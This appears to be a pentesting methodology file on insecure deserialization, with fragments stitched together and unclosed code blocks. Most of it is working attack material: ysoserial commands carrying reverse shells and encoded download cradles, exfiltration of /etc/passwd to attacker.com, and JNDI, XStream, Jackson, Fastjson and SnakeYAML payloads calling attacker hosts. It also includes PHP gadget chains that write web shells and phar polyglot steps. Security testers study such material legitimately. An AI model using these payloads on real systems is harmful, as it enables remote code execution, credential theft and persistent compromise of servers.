curl -sI https://$TARGET/ | grep -i "Set-Cookie.*rememberMe"

# Log4j: test user-controlled fields for JNDI interpolation
curl -H 'User-Agent: ${jndi:dns://COLLAB_HOST/a}' https://$TARGET/
```

### Header / Cookie Signals
```
Content-Type: application/x-java-serialized-object
Cookie containing rO0= prefix (Java base64 serialized)
Cookie: rememberMe= (Apache Shiro)
Cookie: _VIEWSTATE (ASP.NET ViewState without encryption)
Endpoints: /remoting/, /invoker/, /jmx-console/, /wls-wsat/
```

---

# Send as body or cookie
java -jar ysoserial-all.jar CommonsCollections6 'id > /tmp/pwned' | base64 | \
  curl -s https://$TARGET/wls-wsat/CoordinatorPortType \
    -H "Content-Type: application/x-java-serialized-object" \
    --data-binary @-

# Craft gadget chain using phpggc
git clone https://github.com/ambionics/phpggc
php phpggc -l  # list chains
php phpggc Laravel/RCE5 system id | base64
```

# Send as cookie or POST body
curl -s https://$TARGET/api/load-model \
  -H "Content-Type: application/octet-stream" \
  --data-binary @payload.pkl
```

### Phase 3b — PHP phar://, Python YAML, Node deserialization
- **PHP phar:// (no `unserialize()` call)** — any filesystem function (`file_exists`/`fopen`/`getimagesize`) on a `phar://` path deserializes the archive metadata -> object injection with zero `unserialize()` in code.
  ```bash
  phpggc -p phar -o poly.jpg Monolog/RCE1 system id   # valid-image + phar polyglot
  # then reach  phar://uploads/poly.jpg/x  via any fs call
  ```
- **Python `yaml.load()` (CVE-2017-18342)** — pre-5.1 default-unsafe:
  `!!python/object/apply:os.system ['curl http://$COLLAB/yaml']`
- **Node `node-serialize` (CVE-2017-5941)** — IIFE marker in any field passed to `unserialize()`:
  `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://$COLLAB/node')}()"}`

# Test all user-controlled inputs
COLLAB="COLLAB_HOST"
for HEADER in "User-Agent" "X-Forwarded-For" "Referer" "X-Api-Version" "Accept-Language"; do
  curl -s https://$TARGET/ -H "$HEADER: \${jndi:dns://$COLLAB/$HEADER}" &
done

## Chain Table

| Deserialization signal | Chain to | Impact |
|-----------------------|----------|--------|
| Any deser RCE | /etc/passwd + id output | Prove arbitrary command execution |
| RCE as low-privilege user | Find SUID binaries / sudo rules | Privilege escalation → root |
| Blind RCE (OOB callback) | DNS callback → confirm exec | Sufficient for Critical PoC |
| Log4Shell | LDAP → JNDI → class load | Full RCE on JVM process |

---

## Validation

✅ DNS/HTTP callback from COLLAB host: blind deserialization confirmed
✅ Command output in response: full RCE confirmed

**Severity:** Almost always **Critical** — RCE with server process privileges.


### From `normal-skills/insecure-deserialization.md`

name: insecure-deserialization
description: Comprehensive insecure deserialization testing methodology covering Java, PHP, Python, Node.js, and .NET deserialization vulnerabilities, gadget chain construction, POP chain exploitation, phar deserialization, vm sandbox escape, and advanced RCE chains with optimized payloads and detection techniques.
version: 1.0.0
---

## Overview

Insecure Deserialization occurs when an application deserializes attacker-controlled data without proper validation, allowing the reconstruction of arbitrary objects that execute malicious code during or after deserialization. Unlike injection flaws that rely on parsing malicious input, deserialization attacks abuse the native object instantiation logic of the runtime itself.

**Deserialization Attack Surface Context:**
- **Data Interchange Formats:** Binary (Java serialized, .NET BinaryFormatter, Python pickle, PHP serialized), Text (JSON, XML, YAML), Hybrid (Base64-encoded binary within JSON/XML)
- **Trigger Points:** HTTP parameters, cookies, headers, message queues (RabbitMQ, Kafka), cache entries, file uploads, WebSocket messages, API request bodies
- **Execution Vectors:** Magic methods (`__wakeup`, `__destruct`, `__toString`), Gadget chains (chained method invocations), Direct code execution (`Runtime.exec`, `eval`, `pickle.loads`)
- **Impact:** Remote Code Execution (RCE), Authentication Bypass, Privilege Escalation, Denial of Service, Data Tampering

**Key Distinction — Gadgets vs. POP Chains:**
- **Gadget:** A class/method already present in the application classpath that performs a dangerous operation (e.g., `Runtime.exec()`)
- **POP Chain (Property-Oriented Programming):** A series of gadgets linked together through object properties and magic methods to reach a dangerous gadget
- **Gadget Chain:** Pre-constructed sequence of objects (Java) that triggers RCE during deserialization

---

### 1.1 Serialized Data Format Identification

**Java Serialized Objects:**
- **Magic Bytes:** `ac ed 00 05` (hex) or `rO0AB` (Base64)
- **Format:** Binary stream with type descriptors (`TC_OBJECT`, `TC_CLASSDESC`)
- **Common Encodings:** Raw binary, Base64, Base64 URL-safe, Hex
- **Content-Type:** `application/x-java-serialized-object`, `application/octet-stream`

**PHP Serialized Data:**
- **Format:** `a:2:{s:4:"name";s:4:"test";...}`
- **Type Prefixes:** `a` (array), `O` (object), `s` (string), `i` (integer), `b` (boolean), `N` (null), `d` (double)
- **Object Format:** `O:10:"ClassName":2:{s:3:"key";s:5:"value";}`
- **Common Locations:** Cookies (`user_data`), cache files, API parameters, session storage

**Python Pickle:**
- **Protocol 0:** Human-readable text (`(lp0\nI1\n...`)
- **Protocol 1-4:** Binary with header `\x80\x02` (protocol 2), `\x80\x03` (protocol 3), `\x80\x04` (protocol 4), `\x80\x05` (protocol 5)
- **Opcodes:** `c` (GLOBAL), `(` (MARK), `t` (TUPLE), `R` (REDUCE), `.` (STOP)
- **Common Encodings:** Raw binary, Base64, Hex

**.NET BinaryFormatter:**
- **Magic Bytes:** `00 01 00 00 00` (SerializationHeaderRecord)
- **Format:** Binary with type names, assembly names, and member values
- **Common Encodings:** Base64 (ViewState), raw binary, LosFormatter (hex string)

**Node.js / JavaScript:**
- **`node-serialize`:** `{"key":"value","__proto__":{...}}` or custom format `_$$ND_FUNC$$_function(){...}()`
- **`serialize-javascript`:** Similar to JSON with function serialization
- **`vm` module contexts:** Serialized context objects passed to `vm.runInContext()`

**Ruby Marshal:**
- **Magic Byte:** `\x04\x08`
- **Format:** Binary stream with type indicators (`I`, `:`, `o`, `c`)

**Go gob:**
- **Magic Bytes:** `0xff 0x81` or `0xff 0x82`
- **Format:** Self-describing binary encoding

### 1.2 Error-Based Detection
Trigger deserialization errors to confirm the endpoint processes serialized data:

**Java:**
- Submit malformed `ac ed 00 05` stream → `java.io.StreamCorruptedException`
- Submit wrong class type → `java.lang.ClassCastException`
- Submit unknown class → `java.lang.ClassNotFoundException`

**PHP:**
- Submit `O:1:"X":0:{}` → `unserialize(): Error at offset...` or `__PHP_Incomplete_Class`
- Submit `a:99999:{...}` → Memory exhaustion or parsing errors
- Submit malformed UTF-8 in strings → `unserialize(): Error at offset`

**Python:**
- Submit invalid pickle → `pickle.UnpicklingError`, `AttributeError`, `ModuleNotFoundError`
- Submit non-pickle data to `pickle.loads()` → `UnicodeDecodeError` or `ValueError`

**.NET:**
- Submit invalid Base64 to `LosFormatter` → `System.Web.HttpException`
- Submit wrong type to `BinaryFormatter` → `System.Runtime.Serialization.SerializationException`
- Submit unknown assembly → `System.IO.FileNotFoundException`

### 1.3 Behavioral Detection
- **Time-Based:** Submit deeply nested objects to trigger CPU-intensive deserialization
- **DNS OOB:** Embed URLs in serialized objects (Java `URL` class, PHP `SimpleXMLElement`) and monitor for DNS callbacks
- **File System:** Attempt to write files via known gadgets and check for file creation
- **Exception Messages:** Analyze stack traces for framework/library versions (critical for gadget selection)

### 1.4 Technology Fingerprinting
Identify the underlying language/framework to select appropriate payloads:

**HTTP Headers:**
- `X-Powered-By: PHP/7.4.3`
- `Server: Apache-Coyote/1.1` (Java/Tomcat)
- `X-AspNet-Version: 4.0.30319`
- `X-Powered-By: Express` (Node.js)

**Cookie Names:**
- `JSESSIONID` → Java
- `PHPSESSID` → PHP
- `ASP.NET_SessionId` → .NET
- `session` (signed) → Python/Flask
- `connect.sid` → Node.js/Express

**Framework Clues:**
- Laravel → PHP (look for `_token`, `XSRF-TOKEN`)
- Spring Boot → Java (look for actuator endpoints)
- Django → Python (look for `csrftoken`, session format)
- ASP.NET → .NET (look for `__VIEWSTATE`, `__EVENTVALIDATION`)

---

### 2.1 Native Java Serialization (`ObjectInputStream`)
**Format:** Binary stream starting with `ac ed 00 05`

** ysoserial Payload Generation:**
```bash

# CommonsCollections1 (Java 7u21 and earlier, Commons Collections 3.1)
java -jar ysoserial.jar CommonsCollections1 'nc attacker.com 4444 -e /bin/sh'

# CommonsCollections2 (Commons Collections 4.0)
java -jar ysoserial.jar CommonsCollections2 'curl http://attacker.com/exfil'

# CommonsCollections4 (Commons Collections 4.0)
java -jar ysoserial.jar CommonsCollections4 'wget --post-data="$(cat /etc/passwd)" http://attacker.com'

# CommonsCollections5 (Bypasses SecurityManager)
java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}'

# CommonsCollections6 (Alternative chain, no annotations needed)
java -jar ysoserial.jar CommonsCollections6 'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAwAC8AcwBoAC4AcABzADEAJwApAA=='

# Spring1 (Spring Core < 4.2.2)
java -jar ysoserial.jar Spring1 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'

# Jdk7u21 (Java 7 Update 21 and below, no libraries needed)
java -jar ysoserial.jar Jdk7u21 'calc.exe'

# URLDNS (Universal, no libraries, only DNS callback — for detection)
java -jar ysoserial.jar URLDNS 'http://your-burpcollaborator.net'

# JRMPClient / JRMPListener (For JRMP-based exploitation)
java -jar ysoserial.jar JRMPClient '10.10.10.10:1099'
java -jar ysoserial.jar JRMPListener 4444 CommonsCollections1 'nc -e /bin/sh 10.10.10.10 5555'
```

**Gadget Chain Deep Dive:**

**CommonsCollections1 (CC1) Chain:**
```
AnnotationInvocationHandler.readObject()
  → MapEntry.setValue()
    → TransformedMap.checkSetValue()
      → ChainedTransformer.transform()
        → ConstantTransformer.transform()
        → InvokerTransformer.transform()
          → Method.invoke()
            → Runtime.getRuntime().exec()
```

**CommonsCollections2 (CC2) Chain:**
```
PriorityQueue.readObject()
  → heapify()
    → siftDown()
      → siftDownUsingComparator()
        → TransformingComparator.compare()
          → InvokerTransformer.transform()
            → TemplatesImpl.newTransformer()
              → defineTransletClasses()
                → newInstance() of evil class
```

**CommonsCollections3 (CC3) Chain:**
Uses `InstantiateTransformer` + `TrAXFilter` to trigger `TemplatesImpl.newTransformer()` via `TrAXFilter` constructor.

**CommonsCollections5 (CC5) Chain:**
Bypasses `SecurityManager` by using `BadAttributeValueExpException.readObject()` → `toString()` → `LazyMap.get()` chain.

**CommonsCollections6 (CC6) Chain:**
Uses `TiedMapEntry` → `hashCode()` → `getValue()` → `LazyMap.get()` to avoid `AnnotationInvocationHandler` dependency.

**CommonsCollections7 (CC7) Chain:**
Uses `Hashtable.readObject()` → `reconstitutionPut()` → `equals()` → `AbstractMap.equals()` → `LazyMap.get()`

### 2.2 JNDI Injection (Java Naming and Directory Interface)
**Context:** Often chained with deserialization to load remote classes.

**RMI/LDAP Payloads:**
```java
// RMI Reference
new InitialContext().lookup("rmi://attacker.com:1099/Exploit");

// LDAP Reference (Java 8u191+ requires com.sun.jndi.ldap.object.trustURLCodebase=true)
new InitialContext().lookup("ldap://attacker.com:1389/o=reference");

// LDAP Serialized Object (works on newer Java)
new InitialContext().lookup("ldap://attacker.com:1389/o=serialized");
```

**JNDI-Exploit-Kit Usage:**
```bash

# Start LDAP/RMI server with payload
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}" -A 10.10.10.10

# Marshalsec (lightweight JNDI server)
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit" 1389
```

**Java Version Considerations:**
- **Java < 8u191 / 7u201 / 6u211:** Remote classloading via `trustURLCodebase` enabled by default
- **Java >= 8u191:** Must use deserialized objects in LDAP (not Reference) or exploit local gadgets
- **Java >= 11:** RMI codebase disabled, LDAP serialized objects still possible with specific gadgets

### 2.3 XStream Deserialization
**Format:** XML-based serialization

**Vulnerable API:**
```java
XStream xstream = new XStream();
Object obj = xstream.fromXML(xmlInput);  // Vulnerable
```

**RCE Payloads:**
```xml
<!-- ProcessBuilder execution -->
<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        <string>nc</string>
                        <string>-e</string>
                        <string>/bin/sh</string>
                        <string>10.10.10.10</string>
                        <string>4444</string>
                      </command>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer/>
            </is>
          </dataSource>
        </dataHandler>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>
```

**XStream < 1.4.11:** `ImageIO` contains filter gadget
**XStream < 1.4.15:** `javax.sql.rowset.BaseRowSet` gadget
**XStream < 1.4.17:** `PriorityQueue` + `javax.swing.UIDefaults` gadget

### 2.4 Jackson Databind Deserialization
**Format:** JSON with polymorphic type handling

**Vulnerable Configuration:**
```java
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();  // Enables polymorphic deserialization
```

**Payloads (various CVEs):**
```json
// CVE-2017-7525 (Jackson < 2.8.9) - Spring AbstractBeanFactoryPointcutAdvisor
["org.springframework.context.support.FileSystemXmlApplicationContext", "http://attacker.com/spel.xml"]

// CVE-2017-17485 (Jackson < 2.9.4) - Spring JdbcRowSetImpl
{"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}

// CVE-2018-7489 (Jackson < 2.9.5) - JDBC4Connection + MyBatis
["com.mysql.cj.jdbc.admin.MiniAdmin", "jdbc:mysql://attacker.com:3306/db?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"]

// CVE-2019-12384 - Logback/JNDI
["ch.qos.logback.core.db.JNDIConnectionSource", {"jndiLocation":"ldap://attacker.com:1389/Exploit"}]

// CVE-2019-14379 - Ehcache + JNDI
["net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup", {"properties":{"jndiURL":"ldap://attacker.com:1389/Exploit"}}]

// CVE-2020-8840 - Xalan + JNDI
["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", {"transletBytecodes":["BASE64_EVIL_CLASS"],"transletName":"a","outputProperties":{}}]

// CVE-2020-24616 - JNDI via BadAttributeValueExpException
["javax.management.BadAttributeValueExpException", {"val":"ldap://attacker.com:1389/Exploit"}]

// CVE-2020-35728 - JNDI via org.apache.tomcat.dbcp.dbcp2.datasources.PerUserPoolDataSource
["org.apache.tomcat.dbcp.dbcp2.datasources.PerUserPoolDataSource", {"dataSourceName":"ldap://attacker.com:1389/Exploit"}]

// CVE-2021-20190 - JNDI via org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource
["org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource", {"dataSourceName":"ldap://attacker.com:1389/Exploit"}]

// CVE-2022-42003/42004 - Various newer gadgets
```

### 2.5 Fastjson Deserialization
**Format:** JSON (Alibaba library)

**Vulnerable Configuration:**
```java
JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);
JSON.parse(input);  // AutoType enabled
```

**Payloads:**
```json
// JdbcRowSetImpl (Fastjson < 1.2.25)
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}

// TemplatesImpl (Fastjson < 1.2.45, requires Feature.SupportNonPublicField)
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["BASE64_EVIL_BYTECODE"],"_name":"a.b","_tfactory":{},"_outputProperties":{}}

// BCEL ClassLoader (Fastjson < 1.2.51)
{"@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource","x":{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader","$ref":"$.x"},"y":{"$ref":"$.x"}}

// JNDI via org.apache.commons.configuration.JNDIConfiguration (various versions)
{"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"ldap://attacker.com:1389/Exploit"}

// AutoType bypass techniques (check blacklists)
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}
```

### 2.6 SnakeYAML Deserialization
**Format:** YAML

**Vulnerable API:**
```java
Yaml yaml = new Yaml();
Object obj = yaml.load(yamlInput);  // Vulnerable (unsafe)
```

**RCE Payloads:**
```yaml

# ScriptEngineManager (Java 8, Nashorn)
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/"]]]]

# JDBC via JdbcRowSetImpl
!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: "ldap://attacker.com:1389/Exploit", autoCommit: true}

# Spring AbstractBeanFactoryPointcutAdvisor
!!org.springframework.context.support.FileSystemXmlApplicationContext ["http://attacker.com/spel.xml"]

# Runtime.exec via Reflection
!!sun.reflect.misc.MethodUtil [invoke, !!java.lang.Runtime [getRuntime], [exec, "calc"]]

# Apache Commons Configuration JNDI
!!org.apache.commons.configuration.JNDIConfiguration {prefix: "ldap://attacker.com:1389/Exploit"}
```

### 2.7 Kryo Deserialization
**Format:** Binary, high-performance serialization

**Vulnerable Configuration:**
```java
Kryo kryo = new Kryo();
kryo.setRegistrationRequired(false);  // Dangerous
Input input = new Input(data);
Object obj = kryo.readClassAndObject(input);
```

**Exploitation:** Requires custom gadgets or known vulnerable classes in classpath. Often combined with `JavaSerializer` for known types.

### 2.8 Hessian/Burlap Deserialization
**Format:** Binary (Hessian) / XML (Burlap)

**Vulnerable APIs:**
```java
HessianInput in = new HessianInput(inputStream);
Object obj = in.readObject();
```

**Gadgets:**
- `javax.swing.UIDefaults$ProxyLazyValue`
- `com.caucho.naming.QName` + `com.sun.rowset.JdbcRowSetImpl`
- Spring AOP proxies with `JndiObjectFactoryBean`

### 2.9 Java RMI (Remote Method Invocation)
**Detection:**
- Port 1099 (default RMI registry)
- `rmiregistry` banner
- `java.rmi` stubs in traffic

**Exploitation:**
```bash

# Attack with ysoserial payload
java -jar sjet.jar attack <target> 1099 CommonsCollections1 "nc -e /bin/sh 10.10.10.10 4444"

### 2.10 JMX (Java Management Extensions)
**Default Port:** 9010, 9011, 9012, 9013, 9014, 9999, 44444, 44445, 1617

**Exploitation:**
- JMX uses RMI under the hood
- Deserialize malicious MBean via RMI connection
- Use `jmxploit` or `ysoserial` with `JRMPClient`

### 2.11 Jenkins CLI / Remoting
**Protocol:** Jenkins remoting protocol over TCP port 50000 or HTTP

**Exploitation:**
```bash

# Jenkins CVE-2015-8103 / CVE-2016-0788
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/exfil' | nc target 50000

### 3.1 PHP Native Serialization (`unserialize()`)
**Format:** `O:10:"ClassName":2:{s:3:"key";s:5:"value";}`

**Magic Methods Exploitation:**
```php
class VulnerableClass {
    public $cmd;
    
    // Triggered immediately upon unserialize()
    public function __wakeup() {
        system($this->cmd);
    }
    
    // Triggered when object is destroyed (end of script or unset)
    public function __destruct() {
        file_put_contents("/tmp/shell.php", $this->cmd);
    }
    
    // Triggered when object is used as string
    public function __toString() {
        return file_get_contents($this->cmd);
    }
    
    // Triggered when inaccessible method is called
    public function __call($name, $args) {
        eval($this->cmd);
    }
    
    // Triggered when static inaccessible method is called
    public static function __callStatic($name, $args) {
        system($this->cmd);
    }
    
    // Triggered when inaccessible property is read
    public function __get($name) {
        return shell_exec($this->cmd);
    }
    
    // Triggered when inaccessible property is set
    public function __set($name, $value) {
        file_put_contents($name, $value);
    }
    
    // Triggered when inaccessible property is unset
    public function __unset($name) {
        unlink($name);
    }
    
    // Triggered when object is cloned
    public function __clone() {
        system($this->cmd);
    }
    
    // Triggered when object is invoked as function
    public function __invoke() {
        eval($this->cmd);
    }
    
    // Triggered when object is serialized
    public function __sleep() {
        // Can manipulate data before serialization
    }
    
    // Triggered when unserialize() is called (PHP 7.4+)
    public function __unserialize($data) {
        system($data['cmd']);
    }
}
```

### 3.2 POP Chain Construction (Property-Oriented Programming)
**Methodology:**
1. Identify classes with dangerous magic methods (`__destruct`, `__wakeup`, `__toString`)
2. Identify classes with methods that call other object methods or access properties
3. Chain property assignments to bridge from entry point to dangerous gadget

**Example POP Chain:**
```php
// Entry point: __destruct in ClassA
class ClassA {
    public $b;
    function __destruct() {
        $this->b->execute();
    }
}

// Bridge: __call in ClassB
class ClassB {
    public $c;
    function __call($method, $args) {
        $this->c->run($args[0]);
    }
}

// Gadget: ClassC writes file
class ClassC {
    public $file;
    public $data;
    function run($input) {
        file_put_contents($this->file, $this->data . $input);
    }
}

// Payload construction:
$a = new ClassA();
$a->b = new ClassB();
$a->b->c = new ClassC();
$a->b->c->file = "/var/www/html/shell.php";
$a->b->c->data = "<?php system($_GET['cmd']); ?>";

echo serialize($a);
// O:6:"ClassA":1:{s:1:"b";O:6:"ClassB":1:{s:1:"c";O:6:"ClassC":2:{s:4:"file";s:23:"/var/www/html/shell.php";s:4:"data";s:32:"<?php system($_GET['cmd']); ?>";}}}
```

### 3.3 Known Framework Gadgets

**Laravel (Illuminate):**
```php
// Laravel <= 5.5.39, 5.6.x <= 5.6.28
// __destruct in PendingBroadcast → dispatch() → dispatchToQueue()
// Chain to call arbitrary object methods

// Laravel RCE 1 (PendingBroadcast + Dispatcher)
O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"events";O:25:"Illuminate\Bus\Dispatcher":1:{s:16:"queueResolver";a:2:{i:0;O:25:"Mockery\Loader\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{s:10:"connection";O:32:"Illuminate\Contracts\Queue\FakeJob":1:{s:10:"connection";s:12:"phpinfo();die";}}}

// Laravel RCE 2 (PendingBroadcast + Bus Dispatcher)
O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"events";O:39:"Illuminate\Notifications\ChannelManager":3:{s:6:"*app";s:0:"";s:17:"*defaultChannel";s:1:"x";s:17:"*customCreators";a:1:{s:1:"x";s:6:"system";}}s:8:"event";s:6:"whoami";}
```

**Symfony:**
```php
// Symfony 3.4 - CacheAdapter __destruct
// Symfony 4.2 - StringRedirectResponse
// Symfony 5.2 - CacheItem + TagAwareAdapter

// Symfony RCE via CacheAdapter (v3.4)
O:55:"Symfony\Component\Cache\Adapter\TagAwareAdapter":2:{s:57:"Symfony\Component\Cache\Adapter\TagAwareAdapterdeferred";a:1:{i:0;O:47:"Symfony\Component\Cache\CacheItem":2:{s:11:"*innerItem";s:4:"test";s:9:"*poolHash";s:1:"1";}}s:53:"Symfony\Component\Cache\Adapter\TagAwareAdapterpool";O:44:"Symfony\Component\Cache\Adapter\ProxyAdapter":2:{s:54:"Symfony\Component\Cache\Adapter\ProxyAdapterpoolHash";s:1:"1";s:55:"Symfony\Component\Cache\Adapter\ProxyAdaptersetInnerItem";s:6:"system";}}
```

**Monolog (PHP Logging Library):**
```php
// Monolog 1.x - SyslogUdpHandler + BufferHandler
// Monolog 2.x - NativeMailerHandler + WhatFailureGroupHandler

// Monolog RCE 1 (SyslogUdpHandler)
O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:6:"socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"bufferSize";i:-1;s:6:"buffer";a:1:{i:0;a:2:{i:0;s:12:"whoami";s:5:"level";N;}}s:8:"handlers";a:1:{i:0;O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:6:"socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"bufferSize";i:-1;s:6:"buffer";a:1:{i:0;a:2:{i:0;s:12:"whoami";s:5:"level";N;}}s:8:"handlers";a:1:{i:0;r:4;}}s:13:"bufferLimit";i:-1;s:14:"flushOnOverflow";b:1;s:11:"formatter";N;s:8:"initialized";b:1;}}s:13:"bufferLimit";i:-1;s:14:"flushOnOverflow";b:1;s:11:"formatter";N;s:8:"initialized";b:1;}}

// Monolog RCE 2 (NativeMailerHandler)
O:36:"Monolog\Handler\NativeMailerHandler":1:{s:9:"parameters";a:1:{s:8:"to";s:20:";bash -c 'whoami';x";}}
```

**Guzzle (PHP HTTP Client):**
```php
// Guzzle 6.x - CookieJar + FileCookieJar
// __destruct in FileCookieJar → save() → file_put_contents()

O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:41:"GuzzleHttp\Cookie\FileCookieJarfilename";s:23:"/var/www/html/shell.php";s:52:"GuzzleHttp\Cookie\FileCookieJarcookieJar";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:33:"GuzzleHttp\Cookie\SetCookiedata";a:3:{s:4:"Name";s:9:"shell.php";s:5:"Value";s:32:"<?php system($_GET['cmd']); ?>";s:6:"Domain";s:1:"/";}}}s:39:"GuzzleHttp\Cookie\CookieJarcookies";a:0:{}s:41:"GuzzleHttp\Cookie\CookieJarstrictMode";N;}
```

**Doctrine:**
```php
// Doctrine 2.x - CacheProvider + FilesystemCache
// __destruct in FilesystemCache → flushAll() → file operations
```

### 3.4 Phar Deserialization (PHP Archive)
**Concept:** PHP's `phar://` wrapper triggers deserialization of phar metadata when file operations are performed on phar files.

**Affected Functions:**
`file_get_contents()`, `file()`, `file_exists()`, `is_dir()`, `is_file()`, `is_link()`, `is_readable()`, `is_writable()`, `is_executable()`, `fopen()`, `copy()`, `unlink()`, `stat()`, `lstat()`, `readfile()`, `file_put_contents()`, `filemtime()`, `filesize()`, `getimagesize()`, `getimagesizefromstring()`, `exif_read_data()`, `md5_file()`, `sha1_file()`, `hash_file()`, `dirname()`, `basename()`, `pathinfo()`, `glob()`, `scandir()`, `opendir()`, `readdir()`, `rewinddir()`, `closedir()`, `mkdir()`, `rmdir()`, `rename()`, `move_uploaded_file()`, `parse_ini_file()`, `simplexml_load_file()`, `domdocument::load()`, `imagecreatefromgif()`, `imagecreatefrompng()`, `imagecreatefromjpeg()`, `imagecreatefromwbmp()`, `imagecreatefromxbm()`, `imagecreatefromxpm()`, `imagecreatefromgd()`, `imagecreatefromgd2()`, `imagecreatefromstring()`, `imagecreatefromgd2part()`, `imagecreatefromwebp()`, `zip_open()`, `gzopen()`, `bzopen()`, `SplFileInfo::__construct()`, `DirectoryIterator::__construct()`, `FilesystemIterator::__construct()`, `GlobIterator::__construct()`, `Phar::__construct()`, `PharData::__construct()`, `PharFileInfo::__construct()`

**Phar Generation:**
```php
// Create malicious phar
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ? >');

// Embed serialized payload in metadata
class Exploit {
    public $cmd = 'whoami';
    function __destruct() {
        system($this->cmd);
    }
}

$phar->setMetadata(new Exploit());
$phar->stopBuffering();

// Convert to other formats to bypass upload filters
// JPG: prepend JPEG magic bytes
// PNG: prepend PNG magic bytes
// GIF: prepend GIF magic bytes
```

**Phar Upload + Wrapper Exploitation:**
1. Upload phar file disguised as image (prepend magic bytes)
2. Trigger file operation with `phar://uploads/image.jpg/test.txt`
3. Metadata deserialization executes `__destruct()`

**Phar-JPEG Polyglot:**
```bash

### 3.5 Session Deserialization
**PHP Session Handlers:**
- `php` (default): `key|s:5:"value";`
- `php_serialize`: Serialized array
- `php_binary`: Binary format

**Session Handler Mismatch:**
If application writes sessions with `php_serialize` but reads with `php`:
```php
// Write: $_SESSION['data'] = '|O:6:"Exploit":1:{s:3:"cmd";s:6:"whoami";}';
// Stored: data|s:47:"|O:6:"Exploit":1:{s:3:"cmd";s:6:"whoami";}";
// Read with php handler: treats everything after first | as serialized object
// Result: unserialize() processes O:6:"Exploit"...
```

### 3.6 PHP Wrapper Chains
```php
// php://filter for file reading via __toString
php://filter/convert.base64-encode/resource=/etc/passwd

// expect:// for command execution
expect://whoami

// data:// for inline data
data://text/plain,<?php phpinfo(); ?>

// input:// for POST data
php://input
```

---

### 4.1 Pickle Deserialization (`pickle.loads()`)
**Format:** Binary protocol with opcodes

**Dangerous API:**
```python
import pickle
data = b'...'
obj = pickle.loads(data)  # Vulnerable
```

**Pickle Opcodes Reference:**
- `c` (GLOBAL): Push global object (`module\nname\n`)
- `(` (MARK): Push mark
- `t` (TUPLE): Build tuple from stack
- `R` (REDUCE): Call callable with tuple args
- `.` (STOP): Stop and return top of stack
- `i` (INST): Push instance (`module\nname\n`)
- `o` (OBJ): Build object from class and args
- `b` (BUILD): Call `__setstate__` or `__dict__.update()`
- `N` (NONE): Push None
- `S` (STRING): Push string
- `V` (UNICODE): Push unicode
- `p` (PUT): Store in memo
